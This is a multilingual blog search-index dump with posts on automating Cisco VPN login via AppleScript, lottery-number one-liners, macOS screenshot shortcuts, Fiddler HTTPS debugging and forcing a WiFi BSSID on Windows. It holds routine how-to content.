秒内出现。如果您的笔记本电脑速度较慢，请更新 delay 3 中的值。要自动化该过程，请尝试使用播放按钮运行脚本并观察其工作方式。 使用名称（如 VPN Login）保存脚本。 在 System Preferences -&gt; Keyboard -&gt; Shortcuts 中，您可以找到自动化脚本。分配快捷键。默认情况下，脚本在创建期间被分配给文本服务。要使用键盘快捷键，您需要选择一些文本或在启用的文本编辑器中有焦点。 尝试从文本编辑器（如 Atom）中选择文本。设置适当的快捷键后，您应该能够自动化 VPN 登录。此脚本应该适用于 Sierra 或更早版本的 macOS，尽管我自己没有在较旧的系统上测试过。如果您在较旧的 macOS 平台上使用此方法有任何结果，请告诉我 从命令行运行 AppleScript 打开 Apple 的 Script Editor， 选择 New Document 将以下代码粘贴到编辑器中。请参阅 Automator 中的 AppleScript set vpn_name to &quot;&#39;your VPN name&#39;&quot; set user_name to &quot;your username&quot; set passwd to &quot;your password&quot; tell application &quot;System Events&quot; set rc to do shell script &quot;scutil --nc status &quot; &amp; vpn_name if rc starts with &quot;Disconnected&quot; then do shell script &quot;scutil --nc start &quot; &amp; vpn_name &amp; &quot; --user &quot; &amp; user_name delay 3 keystroke passwd keystroke return end if end tell 保存脚本。您可以从终端使用 osascript [programfile] 运行脚本。 玩得开心！","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"MacOS","slug":"MacOS","permalink":"https://neo01.com/tags/MacOS/"}],"lang":"zh-CN"},{"title":"如何在 macOS High Sierra 上自動登入 Cisco VPN","slug":"2017/12/How-to-login-Cisco-VPN-automatically-on-macOS-High-Sierra-zh-TW","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-TW/2017/12/How-to-login-Cisco-VPN-automatically-on-macOS-High-Sierra/","permalink":"https://neo01.com/zh-TW/2017/12/How-to-login-Cisco-VPN-automatically-on-macOS-High-Sierra/","excerpt":"厨煩每次輸入 VPN 密碼？使用 AppleScript 和 Automator 自動化 Cisco VPN 登入，一鍵連接！","text":"在 Macintosh 作業系統（macOS）上登入 Cisco IPSec VPN 時，無法儲存密碼。 對我來說最好的解決方案是在 Automator 中編寫 AppleScript，或從命令列執行它，以自動化登入過程。 Automator 中的 AppleScript 開啟 Apple 的 Automator， 選擇 New Document 選擇 Service 建立的服務預設為 receives selected text。這意味著您需要選擇文字或在文字編輯器中有焦點才能啟用該服務。 嘗試搜尋動作 Run AppleScript。然後，將動作拖曳到右側。 將以下程式碼貼到編輯器中， on run &#123;input, parameters&#125; set vpn_name to &quot;&#39;your VPN name&#39;&quot; set user_name to &quot;your username&quot; set passwd to &quot;your password&quot; tell application &quot;System Events&quot; set rc to do shell script &quot;scutil --nc status &quot; &amp; vpn_name if rc starts with &quot;Disconnected&quot; then do shell script &quot;scutil --nc start &quot; &amp; vpn_name &amp; &quot; --user &quot; &amp; user_name delay 3 keystroke passwd keystroke return end if end tell return input end run 更新腳本中的 vpn_name、username 和 passwd。 您可以參考下面的螢幕截圖來取得 vpn_name，即 VPN (Cisco IPSec)。腳本使用 scutil --nc status 檢查 VPN 連線狀態，並使用 scutil --nc start 啟動 VPN 連線。通常，VPN 登入對話框會在 3 秒內出現。如果您的筆記型電腦速度較慢，請更新 delay 3 中的值。要自動化該過程，請嘗試使用播放按鈕執行腳本並觀察其工作方式。 使用名稱（如 VPN Login）儲存腳本。 在 System Preferences -&gt; Keyboard -&gt; Shortcuts 中，您可以找到自動化腳本。指派快捷鍵。預設情況下，腳本在建立期間被指派給文字服務。要使用鍵盤快捷鍵，您需要選擇一些文字或在啟用的文字編輯器中有焦點。 嘗試從文字編輯器（如 Atom）中選擇文字。設定適當的快捷鍵後，您應該能夠自動化 VPN 登入。此腳本應該適用於 Sierra 或更早版本的 macOS，儘管我自己沒有在較舊的系統上測試過。如果您在較舊的 macOS 平台上使用此方法有任何結果，請告訴我 從命令列執行 AppleScript 開啟 Apple 的 Script Editor， 選擇 New Document 將以下程式碼貼到編輯器中。請參閱 Automator 中的 AppleScript set vpn_name to &quot;&#39;your VPN name&#39;&quot; set user_name to &quot;your username&quot; set passwd to &quot;your password&quot; tell application &quot;System Events&quot; set rc to do shell script &quot;scutil --nc status &quot; &amp; vpn_name if rc starts with &quot;Disconnected&quot; then do shell script &quot;scutil --nc start &quot; &amp; vpn_name &amp; &quot; --user &quot; &amp; user_name delay 3 keystroke passwd keystroke return end if end tell 儲存腳本。您可以從終端機使用 osascript [programfile] 執行腳本。 玩得開心！","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"MacOS","slug":"MacOS","permalink":"https://neo01.com/tags/MacOS/"}],"lang":"zh-TW"},{"title":"How to login Cisco VPN automatically on macOS High Sierra","slug":"2017/12/How-to-login-Cisco-VPN-automatically-on-macOS-High-Sierra","date":"un33fin33","updated":"un66fin66","comments":true,"path":"2017/12/How-to-login-Cisco-VPN-automatically-on-macOS-High-Sierra/","permalink":"https://neo01.com/2017/12/How-to-login-Cisco-VPN-automatically-on-macOS-High-Sierra/","excerpt":"Tired of typing your VPN password every time? Automate Cisco IPSec VPN login on macOS with AppleScript and Automator. One-click connection made easy!","text":"There is no way to save a password when logging into a Cisco IPSec VPN on a Macintosh operating system (macOS). The best solution for me is writing an AppleScript in Automator, or running it from the command line, to automate the login process. AppleScript in Automator Open Apple’s Automator, Choose New Document Select Service The service created has receives selected text by default. It means you need to select text or having focus in a text editor to enable the service. Try to search for action Run AppleScript. Then, drag the action into the right-hand-side. Paste below code into the editor, on run &#123;input, parameters&#125; set vpn_name to &quot;&#39;your VPN name&#39;&quot; set user_name to &quot;your username&quot; set passwd to &quot;your password&quot; tell application &quot;System Events&quot; set rc to do shell script &quot;scutil --nc status &quot; &amp; vpn_name if rc starts with &quot;Disconnected&quot; then do shell script &quot;scutil --nc start &quot; &amp; vpn_name &amp; &quot; --user &quot; &amp; user_name delay 3 keystroke passwd keystroke return end if end tell return input end run Update vpn_name, username and passwd in the script. You can refer to the screenshot below for the vpn_name, which is VPN (Cisco IPSec). The script uses scutil --nc status to check the VPN connection status, and scutil --nc start to initiate the VPN connection. Typically, the VPN login dialog appears within 3 seconds. If your laptop is slow, please update the value in delay 3. To automate the process, try running the script using the play button and observe how it works. Save the script with a name such as VPN Login. In the System Preferences -&gt; Keyboard -&gt; Shortcuts, you can find the automation script. Assign a shortcut key. By default, the script is assigned to the Text service during its creation. To use the keyboard shortcut, you will need to select some text or have focus in a text editor enabled. Try selecting text from a text editor, such as Atom. With the proper shortcut key set up, you should be able to automate the VPN login. This script should work with Sierra or earlier versions of macOS, although I haven’t tested it on older systems myself. Please let me know if you have any results using this method on older macOS platforms AppleScript from command line Open Apple’s Script Editor, Choose New Document Paste below code into the editor. Please refers to AppleScript in Automator set vpn_name to &quot;&#39;your VPN name&#39;&quot; set user_name to &quot;your username&quot; set passwd to &quot;your password&quot; tell application &quot;System Events&quot; set rc to do shell script &quot;scutil --nc status &quot; &amp; vpn_name if rc starts with &quot;Disconnected&quot; then do shell script &quot;scutil --nc start &quot; &amp; vpn_name &amp; &quot; --user &quot; &amp; user_name delay 3 keystroke passwd keystroke return end if end tell Save the script. You can run the script with osascript [programfile] from Terminal. Have fun!","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"MacOS","slug":"MacOS","permalink":"https://neo01.com/tags/MacOS/"}]},{"title":"在 Mac 上将屏幕截图到剪贴板而不是文件","slug":"2017/07/capture-screen-into-clipboard-instead-of-file-on-mac-zh-CN","date":"un22fin22","updated":"un66fin66","comments":true,"path":"/zh-CN/2017/07/capture-screen-into-clipboard-instead-of-file-on-mac/","permalink":"https://neo01.com/zh-CN/2017/07/capture-screen-into-clipboard-instead-of-file-on-mac/","excerpt":"停止在桌面堆积截图文件！重新映射 Mac 快捷键直接截图到剪贴板","text":"许多人知道如何在 Mac 上使用 Command + Shift + 3 进行全屏截图，以及使用 4 进行十字光标选择工具来将屏幕截图到文件。然而，我发现我更想直接将截取的图像粘贴到编辑器中，而不是将图像保存到文件。将屏幕截图到剪贴板的快捷键非常不方便，即 Control + Command + Shift + 3 或 4。以下步骤显示如何重新指定快捷键，以将屏幕截图到剪贴板而不是文件。 1. 前往系统偏好设置并点击键盘， 2. 点击第二个按键以重新指定 Command + Shift + 3 为「将屏幕图片拷贝到剪贴板」。看到冲突图标没关系，因为稍后会解决 3. 点击第一个按键以重新指定 Control + Command + Shift + 3，这个较少使用。 4. 对使用十字光标选择工具进行截图做同样的操作。我个人偏好将屏幕截图到文件的快捷键是 Option + Command + Shift + 3，","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Mac","slug":"Mac","permalink":"https://neo01.com/tags/Mac/"}],"lang":"zh-CN"},{"title":"Linux/Mac 上的六合彩大師","slug":"2017/07/Mark-six-master-on-linuxmac-zh-TW","date":"un22fin22","updated":"un22fin22","comments":true,"path":"/zh-TW/2017/07/Mark-six-master-on-linuxmac/","permalink":"https://neo01.com/zh-TW/2017/07/Mark-six-master-on-linuxmac/","excerpt":"從命令列單行程式碼到 AI 生成的 Python 腳本，探索在 Linux/Mac 上生成六合彩號碼的多種方法。","text":"六合彩是香港的彩票。您可以在彩票上從 49 個號碼池中選擇 6 個號碼。有許多單行命令可用於從 1 到 49 隨機生成 6 個號碼。 python 2 python -c &#39;import random; print [ random.randint(1,49) for _ in xrange(6)]&#39; awk awk -v min&#x3D;1 -v max&#x3D;49 &#39;BEGIN&#123; srand(); for (i &#x3D; 0; i &lt; 6; i++) print int(min+rand()*(max-min+1))&#125;&#39; bash for i in &#123;1..6&#125;; do echo $(( ( RANDOM % 49 ) + 1)); done Mac 上的 jot macOS 10.13 High Sierra 不再提供 jot jot -r -s &#39; &#39; 6 1 49 | tr &#39; &#39; &#39;\\n&#39; 然而，您很快就會發現上述解決方案會生成重複的號碼。獲得不重複生成號碼的技巧是使用包含 49 個號碼的陣列進行隨機排序， python 2 python -c &#39;import random; a &#x3D; range(1, 49); random.shuffle(a); print a[:6:]&#39; Mac 上的 jot macOS 10.13 High Sierra 不再提供 jot jot 49 1 49 | gsort --random-sort | head -n 6 使用 AI 編寫 python 腳本 使用 AI 生成 Python 腳本非常簡單。讓我們編寫一個提示並將其與我們在 2017 年編寫的內容進行比較。提示是：Write a Python script that pick six random unique numbers from 1 to 49, inclusive. Write it simple and testable. import random def get_random_numbers(): return random.sample(range(1, 50), 6) print(get_random_numbers()) 結果很棒！我們也可以將 AI 加入單元測試。 import unittest from your_script import get_random_numbers class TestGetRandomNumbers(unittest.TestCase): def test_length(self): self.assertEqual(len(get_random_numbers()), 6) def test_values(self): numbers &#x3D; get_random_numbers() self.assertTrue(all(1 &lt;&#x3D; x &lt;&#x3D; 49 for x in numbers)) def test_uniqueness(self): numbers &#x3D; get_random_numbers() self.assertTrue(len(set(numbers)) &#x3D;&#x3D; len(numbers)) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: unittest.main() 單元測試比許多開發者都好！","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://neo01.com/tags/Python/"},{"name":"ShellScript","slug":"ShellScript","permalink":"https://neo01.com/tags/ShellScript/"},{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-TW"},{"title":"Mark Six master on Linux/Mac","slug":"2017/07/Mark-six-master-on-linuxmac","date":"un22fin22","updated":"un22fin22","comments":true,"path":"2017/07/Mark-six-master-on-linuxmac/","permalink":"https://neo01.com/2017/07/Mark-six-master-on-linuxmac/","excerpt":"From command-line one-liners to AI-generated Python scripts, explore multiple ways to generate Hong Kong Mark Six lottery numbers on Linux/Mac. See how AI writes better code!","text":"Mark Six is a lottery in Hong Kong. You can select 6 numbers from a pool of 49 numbers on the lottery ticket. There are numerous single-line commands that can be used to generate 6 numbers randomly from 1 to 49. python 2 python -c &#39;import random; print [ random.randint(1,49) for _ in xrange(6)]&#39; awk awk -v min&#x3D;1 -v max&#x3D;49 &#39;BEGIN&#123; srand(); for (i &#x3D; 0; i &lt; 6; i++) print int(min+rand()*(max-min+1))&#125;&#39; bash for i in &#123;1..6&#125;; do echo $(( ( RANDOM % 49 ) + 1)); done jot on Mac macOS 10.13 High Sierra no longer provides jot jot -r -s &#39; &#39; 6 1 49 | tr &#39; &#39; &#39;\\n&#39; However, you will soon find repeated numbers are generated from the above solutions. The trick to have non-repeated generated numbers is using random sort from an array with 49 numbers, python 2 python -c &#39;import random; a &#x3D; range(1, 49); random.shuffle(a); print a[:6:]&#39; jot on Mac macOS 10.13 High Sierra no longer provides jot jot 49 1 49 | gsort --random-sort | head -n 6 Using AI to write python script Using AI to generate Python scripts is extremely straightforward. Let’s write a prompt and compare it with what we wrote in 2017. The prompt is: Write a Python script that pick six random unique numbers from 1 to 49, inclusive. Write it simple and testable. import random def get_random_numbers(): return random.sample(range(1, 50), 6) print(get_random_numbers()) The result is great! We can add AI to unit test as well. import unittest from your_script import get_random_numbers class TestGetRandomNumbers(unittest.TestCase): def test_length(self): self.assertEqual(len(get_random_numbers()), 6) def test_values(self): numbers &#x3D; get_random_numbers() self.assertTrue(all(1 &lt;&#x3D; x &lt;&#x3D; 49 for x in numbers)) def test_uniqueness(self): numbers &#x3D; get_random_numbers() self.assertTrue(len(set(numbers)) &#x3D;&#x3D; len(numbers)) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: unittest.main() The unit test is better than many developers!","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://neo01.com/tags/Python/"},{"name":"ShellScript","slug":"ShellScript","permalink":"https://neo01.com/tags/ShellScript/"},{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}]},{"title":"Linux/Mac 上的六合彩大师","slug":"2017/07/Mark-six-master-on-linuxmac-zh-CN","date":"un22fin22","updated":"un22fin22","comments":true,"path":"/zh-CN/2017/07/Mark-six-master-on-linuxmac/","permalink":"https://neo01.com/zh-CN/2017/07/Mark-six-master-on-linuxmac/","excerpt":"从命令行单行代码到 AI 生成的 Python 脚本，探索在 Linux/Mac 上生成六合彩号码的多种方法。","text":"六合彩是香港的彩票。您可以在彩票上从 49 个号码池中选择 6 个号码。有许多单行命令可用于从 1 到 49 随机生成 6 个号码。 python 2 python -c &#39;import random; print [ random.randint(1,49) for _ in xrange(6)]&#39; awk awk -v min&#x3D;1 -v max&#x3D;49 &#39;BEGIN&#123; srand(); for (i &#x3D; 0; i &lt; 6; i++) print int(min+rand()*(max-min+1))&#125;&#39; bash for i in &#123;1..6&#125;; do echo $(( ( RANDOM % 49 ) + 1)); done Mac 上的 jot macOS 10.13 High Sierra 不再提供 jot jot -r -s &#39; &#39; 6 1 49 | tr &#39; &#39; &#39;\\n&#39; 然而，您很快就会发现上述解决方案会生成重复的号码。获得不重复生成号码的技巧是使用包含 49 个号码的数组进行随机排序， python 2 python -c &#39;import random; a &#x3D; range(1, 49); random.shuffle(a); print a[:6:]&#39; Mac 上的 jot macOS 10.13 High Sierra 不再提供 jot jot 49 1 49 | gsort --random-sort | head -n 6 使用 AI 编写 python 脚本 使用 AI 生成 Python 脚本非常简单。让我们编写一个提示并将其与我们在 2017 年编写的内容进行比较。提示是：Write a Python script that pick six random unique numbers from 1 to 49, inclusive. Write it simple and testable. import random def get_random_numbers(): return random.sample(range(1, 50), 6) print(get_random_numbers()) 结果很棒！我们也可以将 AI 加入单元测试。 import unittest from your_script import get_random_numbers class TestGetRandomNumbers(unittest.TestCase): def test_length(self): self.assertEqual(len(get_random_numbers()), 6) def test_values(self): numbers &#x3D; get_random_numbers() self.assertTrue(all(1 &lt;&#x3D; x &lt;&#x3D; 49 for x in numbers)) def test_uniqueness(self): numbers &#x3D; get_random_numbers() self.assertTrue(len(set(numbers)) &#x3D;&#x3D; len(numbers)) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: unittest.main() 单元测试比许多开发者都好！","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://neo01.com/tags/Python/"},{"name":"ShellScript","slug":"ShellScript","permalink":"https://neo01.com/tags/ShellScript/"},{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-CN"},{"title":"在 Mac 上將螢幕截圖到剪貼簿而不是檔案","slug":"2017/07/capture-screen-into-clipboard-instead-of-file-on-mac-zh-TW","date":"un22fin22","updated":"un66fin66","comments":true,"path":"/zh-TW/2017/07/capture-screen-into-clipboard-instead-of-file-on-mac/","permalink":"https://neo01.com/zh-TW/2017/07/capture-screen-into-clipboard-instead-of-file-on-mac/","excerpt":"停止在桌面堆積截圖檔案！重新映射 Mac 快速鍵直接截圖到剪貼簿","text":"許多人知道如何在 Mac 上使用 Command + Shift + 3 進行全螢幕截圖，以及使用 4 進行十字游標選擇工具來將螢幕截圖到檔案。然而，我發現我更想直接將截取的圖像貼到編輯器中，而不是將圖像儲存到檔案。將螢幕截圖到剪貼簿的快速鍵非常不方便，即 Control + Command + Shift + 3 或 4。以下步驟顯示如何重新指定快速鍵，以將螢幕截圖到剪貼簿而不是檔案。 1. 前往系統偏好設定並點擊鍵盤， 2. 點擊第二個按鍵以重新指定 Command + Shift + 3 為「將螢幕圖片拷貝到剪貼簿」。看到衝突圖示沒關係，因為稍後會解決 3. 點擊第一個按鍵以重新指定 Control + Command + Shift + 3，這個較少使用。 4. 對使用十字游標選擇工具進行截圖做同樣的操作。我個人偏好將螢幕截圖到檔案的快速鍵是 Option + Command + Shift + 3，","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Mac","slug":"Mac","permalink":"https://neo01.com/tags/Mac/"}],"lang":"zh-TW"},{"title":"Capture screen into clipboard instead of file on Mac","slug":"2017/07/capture-screen-into-clipboard-instead-of-file-on-mac","date":"un22fin22","updated":"un66fin66","comments":true,"path":"2017/07/capture-screen-into-clipboard-instead-of-file-on-mac/","permalink":"https://neo01.com/2017/07/capture-screen-into-clipboard-instead-of-file-on-mac/","excerpt":"Stop cluttering your desktop with screenshot files. Learn how to reassign Mac's screenshot shortcuts to capture directly to clipboard for instant pasting.","text":"Many people know how to capture screen into a file on Mac by using Command + Shift + 3 for a full screenshot and 4 for cross hair selection tool. However, I found I want to paste the captured image into an editor directly more than saving the image into a file. The hotkey for taking a screenshot to the clipboard is very inconvenient, which is Control + Command + Shift + 3 or 4. The following steps show how to reassign the shortcuts for taking a screenshot to the clipboard instead of a file. 1. Go to System Preference and click Keyboard, 2. Click on the second key to reassign Command + Shift + 3 for “Copy picture of screen to the clipboard”. It is fine to see the conflict icon as it will be resolved later 3. Click the first key to reassign the Control + Command + Shift + 3 , which is less frequently using. 4. Do the same for capturing with cross hair selection tool. My personal preference for taking screenshot to a file is Option + Command + Shift + 3 ,","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Mac","slug":"Mac","permalink":"https://neo01.com/tags/Mac/"}]},{"title":"我的 Fiddler 食譜","slug":"2017/05/my-fiddler-cookbook-zh-TW","date":"un66fin66","updated":"un00fin00","comments":true,"path":"/zh-TW/2017/05/my-fiddler-cookbook/","permalink":"https://neo01.com/zh-TW/2017/05/my-fiddler-cookbook/","excerpt":"掌握 Fiddler 的必備技巧：HTTPS 解密、簡單負載測試和請求修改。Windows 上最強大的除錯代理工具！","text":"Fiddler 是我在 Windows 上最喜歡的除錯代理。通常，我使用 Python 編寫簡單的除錯代理，通常少於 30 行，直到它需要 https。 啟用 https 解密 這就是為什麼我在 Fiddler 上的第一個配置是解密 HTTPS 流量， 勾選 Decrypt HTTPS traffic 並點擊 OK。 然後它會要求安裝信任根憑證， 可怕的文字是關於 https 流量被 Fiddler 看到的警告。Fiddler 的根憑證現在受信任，這意味著 Fiddler 可以生成您的應用程式（包括您的瀏覽器）信任的憑證。 如果它沒有提示您安裝憑證，您可以使用以下方式安裝憑證， 簡單的負載測試 您可以透過選擇多個請求，然後按 R 來執行非常簡單的負載測試。請注意，來自伺服器的回應可能會在基礎設施的不同層級中快取。 您可以從時間軸看到伺服器的效能如何。 有時您甚至可以透過檢查時間軸來查看 Windows 上的傳出連線數量限制。 修改您的請求 您也可以在發送請求之前修改它，","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[],"lang":"zh-TW"},{"title":"My Fiddler Cookbook","slug":"2017/05/my-fiddler-cookbook","date":"un66fin66","updated":"un66fin66","comments":true,"path":"2017/05/my-fiddler-cookbook/","permalink":"https://neo01.com/2017/05/my-fiddler-cookbook/","excerpt":"Master essential Fiddler tricks: HTTPS decryption, simple load testing, and request modification. The most powerful debugging proxy tool on Windows!","text":"Fiddler is my favorite debugging proxy on Windows. Usually, I use Python to write simple debugging proxy which is usually less than 30 lines until it needs https. Enabling https decryption That’s why my first configuration on Fiddler is Decrypting HTTPS traffic, Check Decrypt HTTPS traffic and click OK. It will then ask to install a Trust Root Certificate, The scary text is a warning about https traffic being seen by Fiddler. Fiddler’s root certificate is now trusted, which means Fiddler can generate certificates trusted by your applications, including your browser. If it doesn’t prompt you to install the certificate, you can have the certificate installed with below, A Simple Load Test You can run a very simple load test by selecting multiple request, and then press R. Beware the response from the server may be cached in different layer of the infrastructure. You can see how well the servers perform from the Timeline. Sometimes you can even see the number of outgoing connection limit on Windows by checking with Timeline. Modifying your request You can also modify your request before sending it out,","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[]},{"title":"我的 Fiddler 食谱","slug":"2017/05/my-fiddler-cookbook-zh-CN","date":"un66fin66","updated":"un00fin00","comments":true,"path":"/zh-CN/2017/05/my-fiddler-cookbook/","permalink":"https://neo01.com/zh-CN/2017/05/my-fiddler-cookbook/","excerpt":"掌握 Fiddler 的必备技巧：HTTPS 解密、简单负载测试和请求修改。Windows 上最强大的调试代理工具！","text":"Fiddler 是我在 Windows 上最喜欢的调试代理。通常，我使用 Python 编写简单的调试代理，通常少于 30 行，直到它需要 https。 启用 https 解密 这就是为什么我在 Fiddler 上的第一个配置是解密 HTTPS 流量， 勾选 Decrypt HTTPS traffic 并点击 OK。 然后它会要求安装信任根证书， 可怕的文字是关于 https 流量被 Fiddler 看到的警告。Fiddler 的根证书现在受信任，这意味着 Fiddler 可以生成您的应用程序（包括您的浏览器）信任的证书。 如果它没有提示您安装证书，您可以使用以下方式安装证书， 简单的负载测试 您可以通过选择多个请求，然后按 R 来运行非常简单的负载测试。请注意，来自服务器的响应可能会在基础设施的不同层级中缓存。 您可以从时间轴看到服务器的性能如何。 有时您甚至可以通过检查时间轴来查看 Windows 上的传出连接数量限制。 修改您的请求 您也可以在发送请求之前修改它，","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[],"lang":"zh-CN"},{"title":"企业网络生存指南 - 如何连接到具有相同 SSID 的另一个 WiFi 路由器","slug":"2016/11/corporate-network-survival-guide-how-to-connect-with-another-wifi-router-with-the-same-ssid-zh-CN","date":"un00fin00","updated":"un00fin00","comments":true,"path":"/zh-CN/2016/11/corporate-network-survival-guide-how-to-connect-with-another-wifi-router-with-the-same-ssid/","permalink":"https://neo01.com/zh-CN/2016/11/corporate-network-survival-guide-how-to-connect-with-another-wifi-router-with-the-same-ssid/","excerpt":"信号满格但无法上网？强制连接到特定 BSSID 解决办公室 WiFi 故障","text":"如果你发现你的笔记本电脑在某个区域有 WiFi 连接，但在某些 WiFi 信号满格的区域失去连接，你可能连接到了故障的 WiFi 路由器。办公室中有许多路由器共享相同的 SSID，以便你的笔记本电脑决定连接到最佳的 WiFi 路由器。然而，有些可能会随着时间而故障。如果你连接到附近的故障 WiFi 路由器，允许你连接但没有适当的互联网连接，以下步骤可能会有所帮助。 首先，使用以下命令检查你连接到哪个 WiFi 路由器： $ netsh wlan show interface 查看 SSID 下的 BSSID。SSID 是一个可以代表多个 WiFi 路由器的 ID，但 BSSID 是特定 WiFi 路由器的唯一 ID： There is 1 interface on the system: Name : Wireless Network Connection Description : Intel(R) Centrino(R) Advanced-N 6205 GUID : d827d652-b7f5-412e-xxxx-1235ea895d99 Physical address : aa:aa:aa:aa:aa:aa State : connected SSID : ABC BSSID : zz:zz:zz:zz:zz:zz Network type : Infrastructure Radio type : 802.11n Authentication : WPA2-Personal Cipher : CCMP Connection mode : Auto Connect Channel : 1 Receive rate (Mbps) : 144 Transmit rate (Mbps) : 144 Signal : 99% Profile : ABC Hosted network status : Not started 笔记本电脑通过路由器 zz:zz:zz:zz:zz:zz 连接到 WiFi 网络 ABC。在 SSID ABC 下还有其他可用的路由器吗？ $ netsh wlan show all 从结果中寻找 SHOW NETWORK MODE=BSSID。它显示 WiFi 网络 ABC 可用的所有路由器： ======================================================================= ======================= SHOW NETWORKS MODE=BSSID ====================== ======================================================================= SSID 8 : ABC Network type : Infrastructure Authentication : WPA2-Personal Encryption : CCMP BSSID 1 : xx:xx:xx:xx:xx:xx Signal : 80% Radio type : 802.11n Channel : 40 Basic rates (Mbps) : 6 12 24 Other rates (Mbps) : 9 18 36 48 54 BSSID 2 : yy:yy:yy:yy:yy:yy Signal : 76% Radio type : 802.11n Channel : 161 Basic rates (Mbps) : 6 12 24 Other rates (Mbps) : 9 18 36 48 54 BSSID 3 : zz:zz:zz:zz:zz:zz Signal : 99% Radio type : 802.11n Channel : 11 Basic rates (Mbps) : 6.5 16 19.5 117 Other rates (Mbps) : 18 19.5 24 36 39 48 54 156 SSID ABC 下有 3 个 BSSID，这意味着当你尝试连接到名为 ABC 的 WiFi 网络时，范围内有 3 个 WiFi 路由器。默认情况下，使用信号最强的 WiFi 路由器，因为它可以提供最佳的连接和传输速度。然而，在这种情况下，信号最强的路由器没有正确配置。我们如何强制笔记本电脑连接到正常运作的路由器，即使信号较弱？假设我们想连接到 BSSID 为 xx:xx:xx:xx:xx:xx 的路由器。 强制使用 BSSID 连接 在 Windows 中，我们可以进入控制面板并管理你的 WiFi 设置。右键点击你想连接的 WiFi 网络，然后选择属性。 在无线网络属性中，勾选_启用 Intel 连接设置_，然后点击配置。 选择_强制访问点_，输入你想连接的 BSSID。点击确定以保存设置。 由于信号强度差导致连接不佳，速度可能会较慢，但至少你可以生存下来，直到有人修复问题。 上述选项仅适用于 Intel WiFi 适配器。我不知道其他 WiFi 驱动程序是否提供强制 BSSID 的功能。如果你在其他 WiFi 驱动程序中找到它，请告诉我。","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Enterprise","slug":"Enterprise","permalink":"https://neo01.com/tags/Enterprise/"},{"name":"Wifi","slug":"Wifi","permalink":"https://neo01.com/tags/Wifi/"}],"lang":"zh-CN"},{"title":"企業網路生存指南 - 如何連接到具有相同 SSID 的另一個 WiFi 路由器","slug":"2016/11/corporate-network-survival-guide-how-to-connect-with-another-wifi-router-with-the-same-ssid-zh-TW","date":"un00fin00","updated":"un00fin00","comments":true,"path":"/zh-TW/2016/11/corporate-network-survival-guide-how-to-connect-with-another-wifi-router-with-the-same-ssid/","permalink":"https://neo01.com/zh-TW/2016/11/corporate-network-survival-guide-how-to-connect-with-another-wifi-router-with-the-same-ssid/","excerpt":"訊號滿格但無法上網？強制連接到特定 BSSID 解決辦公室 WiFi 故障","text":"如果你發現你的筆記型電腦在某個區域有 WiFi 連線，但在某些 WiFi 訊號滿格的區域失去連線，你可能連接到了故障的 WiFi 路由器。辦公室中有許多路由器共享相同的 SSID，以便你的筆記型電腦決定連接到最佳的 WiFi 路由器。然而，有些可能會隨著時間而故障。如果你連接到附近的故障 WiFi 路由器，允許你連接但沒有適當的網際網路連線，以下步驟可能會有所幫助。 首先，使用以下命令檢查你連接到哪個 WiFi 路由器： $ netsh wlan show interface 查看 SSID 下的 BSSID。SSID 是一個可以代表多個 WiFi 路由器的 ID，但 BSSID 是特定 WiFi 路由器的唯一 ID： There is 1 interface on the system: Name : Wireless Network Connection Description : Intel(R) Centrino(R) Advanced-N 6205 GUID : d827d652-b7f5-412e-xxxx-1235ea895d99 Physical address : aa:aa:aa:aa:aa:aa State : connected SSID : ABC BSSID : zz:zz:zz:zz:zz:zz Network type : Infrastructure Radio type : 802.11n Authentication : WPA2-Personal Cipher : CCMP Connection mode : Auto Connect Channel : 1 Receive rate (Mbps) : 144 Transmit rate (Mbps) : 144 Signal : 99% Profile : ABC Hosted network status : Not started 筆記型電腦透過路由器 zz:zz:zz:zz:zz:zz 連接到 WiFi 網路 ABC。在 SSID ABC 下還有其他可用的路由器嗎？ $ netsh wlan show all 從結果中尋找 SHOW NETWORK MODE=BSSID。它顯示 WiFi 網路 ABC 可用的所有路由器： ======================================================================= ======================= SHOW NETWORKS MODE=BSSID ====================== ======================================================================= SSID 8 : ABC Network type : Infrastructure Authentication : WPA2-Personal Encryption : CCMP BSSID 1 : xx:xx:xx:xx:xx:xx Signal : 80% Radio type : 802.11n Channel : 40 Basic rates (Mbps) : 6 12 24 Other rates (Mbps) : 9 18 36 48 54 BSSID 2 : yy:yy:yy:yy:yy:yy Signal : 76% Radio type : 802.11n Channel : 161 Basic rates (Mbps) : 6 12 24 Other rates (Mbps) : 9 18 36 48 54 BSSID 3 : zz:zz:zz:zz:zz:zz Signal : 99% Radio type : 802.11n Channel : 11 Basic rates (Mbps) : 6.5 16 19.5 117 Other rates (Mbps) : 18 19.5 24 36 39 48 54 156 SSID ABC 下有 3 個 BSSID，這意味著當你嘗試連接到名為 